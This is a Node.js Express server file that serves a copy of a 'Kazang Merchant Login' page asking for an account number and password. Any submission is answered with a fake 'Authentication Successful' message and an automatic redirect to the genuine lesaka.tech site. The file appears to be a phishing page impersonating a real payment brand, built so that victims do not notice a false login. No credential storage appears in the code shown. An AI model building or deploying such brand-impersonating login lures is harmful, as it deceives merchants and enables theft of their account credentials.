const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Serve static files like footprint.jpg from root
app.use(express.static(path.join(__dirname)));

// Main Login Route
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Kazang Portal - Login</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: Arial, Helvetica, sans-serif;
    }
    body {
      background-color: #f4f6f8;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
    }
    .header-banner {
      width: 100%;
      background-color: #ffffff;
      padding: 15px 20px;
      display: flex;
      justify-content: center;
      align-items: center;
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
      margin-bottom: 30px;
    }
    .footprint-img {
      max-height: 80px;
      object-fit: contain;
      mix-blend-mode: multiply; /* Blends footprint cleanly onto white background */
    }
    .login-container {
      background: #ffffff;
      padding: 30px 25px;
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
    }
    .login-header {
      margin-bottom: 25px;
      text-align: center;
      color: #333333;
    }
    .form-group {
      margin-bottom: 20px;
    }
    .form-group label {
      display: block;
      margin-bottom: 6px;
      font-weight: bold;
      color: #444444;
      font-size: 14px;
    }
    .form-group input {
      width: 100%;
      padding: 12px;
      border: 2px solid #ccc;
      border-radius: 4px;
      font-size: 15px;
      outline: none;
      transition: border-color 0.2s ease, background-color 0.2s ease;
    }
    /* Default initial border state prior to typing */
    .form-group input.invalid {
      border-color: #e53e3e !important;
      background-color: #fff5f5 !important;
    }
    .form-group input.valid {
      border-color: #38a169 !important;
      background-color: #f0fff4 !important;
    }
    .btn-submit {
      width: 100%;
      padding: 12px;
      background-color: #0056b3;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s ease;
    }
    .btn-submit:hover {
      background-color: #004085;
    }
    .hint-text {
      font-size: 12px;
      color: #666;
      margin-top: 4px;
      display: block;
    }
  </style>
</head>
<body>

  <div class="header-banner">
    <img src="/footprint.jpg" alt="Kazang Banner Footprint" class="footprint-img" />
  </div>

  <div class="login-container">
    <h2 class="login-header">Kazang Merchant Login</h2>
    <form action="/login" method="POST">
      <div class="form-group">
        <label for="accountNumber">Account Number</label>
        <input 
          type="text" 
          id="accountNumber" 
          name="accountNumber" 
          placeholder="Enter 10-digit account number" 
          required 
          autocomplete="off"
        />
        <span class="hint-text" id="digitHint">Must be exactly 10 digits</span>
      </div>

      <div class="form-group">
        <label for="password">Password</label>
        <input 
          type="password" 
          id="password" 
          name="password" 
          placeholder="Enter password" 
          required 
        />
      </div>

      <button type="submit" class="btn-submit">LOGIN</button>
    </form>
  </div>

  <script>
    const accountInput = document.getElementById('accountNumber');
    const hintText = document.getElementById('digitHint');

    accountInput.addEventListener('input', () => {
      const value = accountInput.value.trim();
      const length = value.length;

      if (length === 0) {
        accountInput.classList.remove('valid', 'invalid');
        accountInput.style.borderColor = '#ccc';
        accountInput.style.backgroundColor = '#ffffff';
        hintText.style.color = '#666';
        hintText.textContent = 'Must be exactly 10 digits';
      } else if (length === 10) {
        accountInput.classList.remove('invalid');
        accountInput.classList.add('valid');
        hintText.style.color = '#38a169';
        hintText.textContent = '✓ 10 Digits Entered';
      } else {
        accountInput.classList.remove('valid');
        accountInput.classList.add('invalid');
        hintText.style.color = '#e53e3e';
        hintText.textContent = length < 10 
          ? \`Too short (\${length}/10 digits)\` 
          : \`Too long (\${length}/10 digits)\`;
      }
    });
  </script>

</body>
</html>
  `);
});

// Authentication Handling Route
app.post('/login', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Authentication Successful</title>
  <style>
    body {
      background-color: #f4f6f8;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .card {
      background: white;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
      text-align: center;
      max-width: 400px;
    }
    .success-icon {
      color: #28a745;
      font-size: 48px;
      margin-bottom: 15px;
    }
    h2 {
      color: #333;
      margin-bottom: 10px;
    }
    p {
      color: #666;
      font-size: 15px;
      margin-bottom: 20px;
    }
    .timer {
      font-weight: bold;
      color: #0056b3;
    }
  </style>
</head>
<body>

  <div class="card">
    <div class="success-icon">✓</div>
    <h2>Authentication Successful</h2>
    <p>Redirecting to Lesaka in <span class="timer" id="countdown">6</span> seconds...</p>
  </div>

  <script>
    let seconds = 6;
    const timerElement = document.getElementById('countdown');

    const interval = setInterval(() => {
      seconds--;
      timerElement.textContent = seconds;
      if (seconds <= 0) {
        clearInterval(interval);
        window.location.href = 'https://lesaka.tech/';
      }
    }, 1000);
  </script>

</body>
</html>
  `);
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});